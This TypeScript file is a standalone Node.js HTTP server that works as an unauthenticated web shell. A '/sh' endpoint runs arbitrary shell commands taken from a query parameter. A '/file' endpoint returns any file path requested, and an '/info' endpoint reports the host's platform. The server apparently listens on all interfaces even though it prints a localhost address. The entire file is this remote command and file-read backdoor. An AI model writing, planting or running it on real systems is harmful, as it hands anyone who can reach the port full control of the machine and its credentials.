import { argv, exit, platform, arch } from "node:process";
import { promisify, styleText } from "node:util";
import { readFile } from "node:fs/promises";
import { exec } from "node:child_process";
import { extname } from "node:path";
import { Server, RequestListener } from "node:http";

import type { AddressInfo } from "node:net";

void new (class {
	readonly #server: Server = new Server();
	readonly #port = ((p?: string): number => (p !== undefined && !isNaN(+p) ? +p : 0))(argv[2]);
	constructor() {
		const callRequestHandler: RequestListener = (req, res) => {
			this.#logger(req, res);
			if (req.method !== "GET") return res.writeHead(404).end();
			if (req.url?.includes("/sh")) return this.#shHandler(req, res);
			if (req.url?.includes("/file")) return this.#fileHandler(req, res);
			if (req.url?.includes("/info")) return this.#info(req, res);
			if (req.url?.includes("/status")) return res.writeHead(204).end();
			return res.writeHead(404).end();
		};

		try {
			const { port } = this.#server
				.on("request", callRequestHandler)
				.listen(this.#port, () => console.info(styleText(["bold", "green"], `\n[*] Server: http://127.0.0.1:${port}`)))
				.address() as AddressInfo;

			process.on("SIGINT", this.#shutDown);
			process.on("SIGTERM", this.#shutDown);
		} catch (error) {
			console.trace(error);
			this.#shutDown();
		}
	}

	readonly #logger: RequestListener = ({ method, url }, res) => {
		const start = Date.now();
		const strMethod = styleText(["bgWhite", "bold", "black"], `[${method}]`);
		const strUrl = styleText(["blue", "bold"], `${url}`);
		res.on("finish", () => {
			const time = Date.now() - start;
			console.log(`${strMethod} - ${strUrl} - ${res.statusCode} - ${time}ms`);
		});
	};

	readonly #info: RequestListener = (_, res) => {
		res.writeHead(200, this.#getContentType("plain")).write(`${platform} ${arch}`);
		return res.end();
	};

	readonly #shHandler: RequestListener = async (req, res) => {
		const { command } = this.#extractQueryParams<{ command: string }>(req.url as string);
		if (command === undefined) return res.writeHead(400).end();
		try {
			const { stderr, stdout } = await promisify(exec)(command);
			res.writeHead(200, this.#getContentType("plain")).write(`${stdout} \n\n${stderr}`);
		} catch (error) {
			res.writeHead(400, this.#getContentType("json")).write(JSON.stringify(error));
		}
		return res.end();
	};

	readonly #fileHandler: RequestListener = async (req, res) => {
		const { name } = this.#extractQueryParams<{ name: string }>(req.url as string);
		if (name === undefined) return res.writeHead(400).end();
		try {
			const contentType = this.#getContentType(extname(name));
			res.writeHead(200, contentType).write(await readFile(name));
		} catch (error) {
			console.trace(error);
			res.writeHead(400).write(error);
		}
		return res.end();
	};

	readonly #extractQueryParams = <T extends object>(endpoint: string): T => {
		const [_, queryString] = endpoint.split("?");
		if (queryString === undefined) return { query: {} } as T;
		const url = new URL("https://example.com" + endpoint);
		const searchParams = new URLSearchParams(url.search);
		return Object.fromEntries(searchParams.entries()) as T;
	};

	readonly #getContentType = (type: string): { "Content-Type": string } | undefined => {
		let result: string | undefined;
		if (!type.includes(".")) result = this.#contentTypes[type];
		else result = this.#contentTypes[type.split(".").pop() as string];
		return result !== undefined ? { "Content-Type": result } : undefined;
	};

	readonly #contentTypes: Record<string, `${string}/${string}`> = {
		zip: "application/zip",
		pdf: "application/pdf",
		json: "application/json",
		xml: "application/xml",
		plain: "text/plain",
		txt: "text/plain",
		html: "text/html",
		css: "text/css",
		png: "image/png",
		jpg: "image/jpg",
		jpeg: "image/jpeg",
		gif: "image/gif",
		svg: "image/svg+xml",
		webp: "image/webp",
		mp3: "audio/mp3",
		wav: "audio/wav",
		ogg: "audio/ogg",
		mp4: "video/mp4",
		mkv: "video/mkv",
		webm: "video/webm",
		avi: "video/x-msvideo",
	};

	readonly #shutDown = (): void => {
		console.info(styleText(["bold", "red"], "\n\n[!] Stopping server."));
		this.#server.close();
		exit(1);
	};
})();
